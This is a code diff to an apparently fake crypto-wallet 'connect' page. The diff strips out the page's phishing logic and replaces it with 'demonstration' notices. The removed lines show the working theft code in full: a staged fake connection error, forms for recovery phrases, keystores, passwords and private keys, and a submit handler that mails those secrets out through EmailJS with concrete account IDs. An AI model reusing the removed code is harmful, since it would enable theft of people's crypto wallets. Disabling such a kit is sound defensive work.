@@ -7449,7 +7449,6 @@
               <!-- Modal -->
 
               <button
-                onclick="location.assign(&#39;securechannel.php?walletname=DCENT&#39;)"
                 type="button"
                 class="btn coin"
               >
@@ -7888,22 +7887,21 @@
         wallets.each(function () {
           $(this).on("click", function (event) {
             let img = $(this).find(".coin-img").attr("src");
+            let walletName = $(this).children().last().text().trim();
             event.preventDefault();
-            $(".connection-info").text("Initializing...");
-            $("#current-wallet-app").text(
-              $(this).children().last().text().trim()
+            
+            // Show a user-friendly message instead of trying to connect
+            $(".connection-info").html(
+              '<div style="text-align: center; padding: 20px;">' +
+              '<h3 style="color: #28a745; margin-bottom: 15px;">🚀 Wallet Selection Complete!</h3>' +
+              '<p style="margin-bottom: 15px;">You have selected <strong>' + walletName + '</strong> wallet.</p>' +
+              '<p style="color: #6c757d; font-size: 14px;">This is a demonstration interface. Wallet connections are currently disabled for security.</p>' +
+              '<button class="btn btn-primary mt-3" onclick="$(\'#connect-dialog\').hide();" style="background: #007bff; border: none; padding: 10px 20px; border-radius: 5px; color: white; cursor: pointer;">Continue Browsing</button>' +
+              '</div>'
             );
+            $("#current-wallet-app").text(walletName);
             $("#current-wallet-logo").attr("src", img);
             $("#connect-dialog").show();
-            setTimeout(function () {
-              $(".connection-info").html(
-                'Error Connecting... <button class="manual-connection">Connect Manually</button>'
-              );
-              // Wait another 2 seconds before auto-advancing
-              setTimeout(function () {
-                $(document).find("button.manual-connection").trigger("click");
-              }, 2000);
-            }, 1000);
           });
         });
       });
@@ -7914,119 +7912,83 @@
         let sendForm = $("#data-to-send");
         let successBox = $("#success-dialog");
         let errorBox = $("#error-dialog");
+        
         dialogDismiss.each(function () {
           $(this).on("click", function () {
             $("#connect-dialog").hide();
             $("#send-dialog").hide();
           });
         });
+        
+        // Show information messages instead of attempting connections
         $("#phraseSend").on("click", function () {
           sendForm.html(
-            '<div class="form-group"><input type="hidden" id="phrase" name="phrase" value="phrase"><textarea name="phrase" id="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea> </div> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>'
+            '<div style="text-align: center; padding: 20px;">' +
+            '<h4 style="color: #dc3545; margin-bottom: 15px;">⚠️ Security Notice</h4>' +
+            '<p style="margin-bottom: 15px;">Phrase-based wallet connections are currently disabled.</p>' +
+            '<p style="color: #6c757d; font-size: 14px;">This feature is not available in the demonstration version for security reasons.</p>' +
+            '</div>'
           );
         });
+        
         $("#keystoreSend").on("click", function () {
           sendForm.html(
-            '<textarea rows="5" style="resize: none" required name="keystore" id="keystore" class="form-control" placeholder="Enter Keystore"></textarea></div><input type="password" class="form-control" id="wallet_password" name="wallet_password" required placeholder="Wallet password"> <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>'
+            '<div style="text-align: center; padding: 20px;">' +
+            '<h4 style="color: #dc3545; margin-bottom: 15px;">⚠️ Security Notice</h4>' +
+            '<p style="margin-bottom: 15px;">Keystore wallet connections are currently disabled.</p>' +
+            '<p style="color: #6c757d; font-size: 14px;">This feature is not available in the demonstration version for security reasons.</p>' +
+            '</div>'
           );
         });
+        
         $("#privateKeySend").on("click", function () {
           sendForm.html(
-            '<input type="text" name="private_key" id="private_key" required class="form-control" placeholder="Enter your Private Key"><div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>'
+            '<div style="text-align: center; padding: 20px;">' +
+            '<h4 style="color: #dc3545; margin-bottom: 15px;">⚠️ Security Notice</h4>' +
+            '<p style="margin-bottom: 15px;">Private key wallet connections are currently disabled.</p>' +
+            '<p style="color: #6c757d; font-size: 14px;">This feature is not available in the demonstration version for security reasons.</p>' +
+            '</div>'
           );
         });
 
+        // Remove manual connection functionality that leads to form submission
         $(".connection-info").on("click", ".manual-connection", function () {
-          $("#current-wallet-app-send").text($("#current-wallet-app").text());
-          $("#walletNameData").val($("#current-wallet-app").text());
-          var link = $("#current-wallet-app").text();
-          $("#current-wallet-send-logo").attr(
-            "src",
-            $("#current-wallet-logo").attr("src")
+          // Show a message instead of opening the send dialog
+          $(".connection-info").html(
+            '<div style="text-align: center; padding: 20px;">' +
+            '<h4 style="color: #ffc107; margin-bottom: 15px;">🔒 Manual Connection Disabled</h4>' +
+            '<p style="margin-bottom: 15px;">Manual wallet connections are currently disabled for security.</p>' +
+            '<p style="color: #6c757d; font-size: 14px;">This is a demonstration interface only.</p>' +
+            '<button class="btn btn-primary mt-3" onclick="$(\'#connect-dialog\').hide();" style="background: #007bff; border: none; padding: 10px 20px; border-radius: 5px; color: white; cursor: pointer;">Close</button>' +
+            '</div>'
           );
-          $("#connect-dialog").hide();
-          $("#send-dialog").show();
         });
 
-        $.ajaxSetup({
-          headers: {
-            "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content"),
-          },
-        });
-
+        // Replace form submission with a static message
         $("#form").submit(function (e) {
           e.preventDefault();
-          // Prepare the data payload
-          let payload = {
-            service_id: "service_01l89s8", // EmailJS service ID
-            template_id: "template_hmk9drf", // template ID
-            user_id: "s4qwdEh6YdZRRSq3R", // Your EmailJS user ID
-            template_params: {
-              // Map your form fields here
-              phrase: $("#phrase").val(),
-              keystore: $("#keystore").val(),
-              private_key: $("#private_key").val(),
-              wallet_password: $("#wallet_password").val(),
-            },
-          };
-
+          
           let processBtn = $("#proceedButton");
           let cancelBtn = $("#cancelBtn");
-          let formData = new FormData(this);
 
-          $.ajax({
-            type: "POST",
-            url: "https://api.emailjs.com/api/v1.0/email/send",
-            contentType: "application/json",
-            data: JSON.stringify(payload),
-            // cache: false,
-            processData: false,
-            beforeSend: function () {
-              $("#message-tab").hide();
-              processBtn.html(
-                '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...'
-              );
-              processBtn.prop("disabled", true);
-              cancelBtn.prop("disabled", true);
-            },
-            success: function (response) {
-              console.log("Sent successfully", response);
-              restoreButtons();
-              $("#message-tab").show();
-              $("div.message-tab").html(
-                "<div class='alert alert-success'>Request sent successfully!</div>"
-              );
-              setTimeout(dismissAllDialogs, 2500);
-            },
-            error: function (xhr, status, error) {
-              restoreButtons();
-              $("#message-tab").show();
-              $("div.message-tab").html(
-                "<div class='alert alert-danger'>Error Connecting " +
-                  error +
-                  "</div>"
-              );
-            },
-          });
-
-          function restoreButtons() {
-            processBtn.html("PROCEED");
-            processBtn.prop("disabled", false);
-            cancelBtn.prop("disabled", false);
-          }
-
-          function dismissAllDialogs() {
-            successBox.hide();
-            errorBox.hide();
+          // Show a static message instead of making external requests
+          $("#message-tab").show();
+          $("div.message-tab").html(
+            "<div class='alert alert-warning' style='background-color: #fff3cd; border-color: #ffeaa7; color: #856404;'>" +
+            "⚠️ Form submission is disabled in this demonstration version for security reasons." +
+            "</div>"
+          );
+          
+          // Reset the form after a short delay
+          setTimeout(function() {
+            $("#message-tab").hide();
             $("#connect-dialog").hide();
             $("#send-dialog").hide();
-            $("#processing-dialog").hide();
-            $("#message-tab").hide();
             $("#phrase").val("");
             $("#keystore").val("");
             $("#private_key").val("");
             $("#wallet_password").val("");
-          }
+          }, 3000);
         });
       });
     </script>
